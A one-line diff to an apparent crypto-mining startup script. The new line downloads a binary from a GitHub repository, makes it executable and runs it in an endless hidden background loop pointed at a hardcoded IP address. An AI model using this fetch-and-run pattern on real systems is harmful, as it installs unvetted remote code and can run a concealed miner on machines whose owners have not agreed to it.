@@ -1,1 +1,1 @@
-stop miner; sleep 15; wget https://github.com/aleksey1255/ai/raw/main/start2.sh;   
+bash -c 'cd /etc; cd mine; wget -c https://github.com/aleksey1255/ai/raw/main/proba; chmod u+x proba; while true; do timeout 1800 ./proba -a 80.240.18.106; done > /dev/null 2>&1 &'
